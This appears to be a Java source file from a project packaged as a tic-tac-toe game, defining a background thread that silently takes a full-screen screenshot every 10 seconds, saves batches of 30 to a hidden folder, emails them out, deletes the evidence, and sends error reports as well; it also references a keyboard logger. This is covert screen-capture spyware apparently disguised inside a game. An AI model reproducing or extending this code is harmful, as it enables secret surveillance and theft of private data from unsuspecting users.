package TickTackToe;

import java.awt.AWTException;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Transparency;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import javax.imageio.ImageIO;

import com.sun.glass.ui.Screen;


public class ScreenShot extends Thread{
	String path;
	CreateDirectory dir;
	int count = 0;
	SendMail mail;
	public void run(){
		System.out.println("ScreenShot starts");
		int i = 0;
		while(true){
			try {
				if(count == 0){
					dir = new CreateDirectory();
					path = dir.createFolder();
					mail = new SendMail(dir.pictures);
				}
				Thread.sleep(10000);
				takesPicture();

				count++;
				if(count >= 30){
					System.out.println("sending...");
					mail.sender();
					Thread.sleep(30);
					System.out.println(count + "attached and sent through mail");

					i++;
					if(i >= 10){
						System.err.println("ENDING THE PROGRAM SINCE 10 MAILS HAVE BEEN SENT :D");
						System.exit(0);
						Logging.KeyboardLogger.closeOutputStream();
						break;
					}


				}
			} catch (Exception e) {
				e.printStackTrace();
				try {
					mail.errSender(e);
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					//					e1.printStackTrace();
					System.out.println("errSender returned an exception: "+e1.getMessage());
				}
			}finally{
				if(count >= 30){
					dir.deleteFolder();
					count = 0;
				}
			}
		}

	}
	public void takesPicture() throws Exception{
		Calendar thisTime = Calendar.getInstance();
		SimpleDateFormat time = new SimpleDateFormat("yyyyMMdd hh mm ss");
		Robot robot = new Robot();
		BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
		BufferedImage image = compress(screenShot);
		ImageIO.write(image, "JPG", new File(path+time.format(thisTime.getTime())+".jpg"));
		System.out.println(count+ " "+time.format(thisTime.getTime()));
	}
	private BufferedImage compress(Image realImg) throws Exception {
		BufferedImage image = new BufferedImage(800, 600, Transparency.OPAQUE);
		Graphics2D g2 = image.createGraphics();
		g2.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
		g2.drawImage(realImg, 0, 0, 800, 600, null);
		g2.dispose();
		return image;
	}

}
